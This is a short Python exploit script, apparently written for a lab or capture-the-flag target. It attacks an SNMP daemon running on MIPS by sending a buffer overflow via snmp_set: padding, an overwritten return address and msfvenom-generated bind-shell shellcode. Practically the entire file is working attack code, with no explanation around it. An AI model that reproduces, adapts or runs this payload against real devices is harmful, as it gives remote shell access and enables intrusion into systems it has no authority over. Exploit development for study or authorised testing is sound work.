#coding=utf-8
from easysnmp import snmp_get,snmp_set
import struct

#  qemu-mipsel -L `pwd` -g 1357 ./bin/snmpd -f -Le 161

HOST = ""
OID = "1.3.6.1.4.1.233333.1.0"

# msfvenom -a mipsle -p linux/mipsle/shell_bind_tcp -f python
buf =  ""
buf += "\xe0\xff\xbd\x27\xfd\xff\x0e\x24\x27\x20\xc0\x01\x27"
buf += "\x28\xc0\x01\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x01"
buf += "\x01\x01\xff\xff\x50\x30\xef\xff\x0e\x24\x27\x70\xc0"
buf += "\x01\x11\x5c\x0d\x24\x04\x68\xcd\x01\xfd\xff\x0e\x24"
buf += "\x27\x70\xc0\x01\x25\x68\xae\x01\xe0\xff\xad\xaf\xe4"
buf += "\xff\xa0\xaf\xe8\xff\xa0\xaf\xec\xff\xa0\xaf\x25\x20"
buf += "\x10\x02\xef\xff\x0e\x24\x27\x30\xc0\x01\xe0\xff\xa5"
buf += "\x23\x49\x10\x02\x24\x0c\x01\x01\x01\x25\x20\x10\x02"
buf += "\x01\x01\x05\x24\x4e\x10\x02\x24\x0c\x01\x01\x01\x25"
buf += "\x20\x10\x02\xff\xff\x05\x28\xff\xff\x06\x28\x48\x10"
buf += "\x02\x24\x0c\x01\x01\x01\xff\xff\xa2\xaf\xfd\xff\x11"
buf += "\x24\x27\x88\x20\x02\xff\xff\xa4\x8f\x21\x28\x20\x02"
buf += "\xdf\x0f\x02\x24\x0c\x01\x01\x01\xff\xff\x10\x24\xff"
buf += "\xff\x31\x22\xfa\xff\x30\x16\xff\xff\x06\x28\x62\x69"
buf += "\x0f\x3c\x2f\x2f\xef\x35\xec\xff\xaf\xaf\x73\x68\x0e"
buf += "\x3c\x6e\x2f\xce\x35\xf0\xff\xae\xaf\xf4\xff\xa0\xaf"
buf += "\xec\xff\xa4\x27\xf8\xff\xa4\xaf\xfc\xff\xa0\xaf\xf8"
buf += "\xff\xa5\x27\xab\x0f\x02\x24\x0c\x01\x01\x01"

payload='a'*0x8c+ struct.pack("<I",0x4d22d0+0x90).decode("latin1") + buf


snmp_set(OID,payload,type="OCTETSTR",hostname=HOST,community="private",version=2)
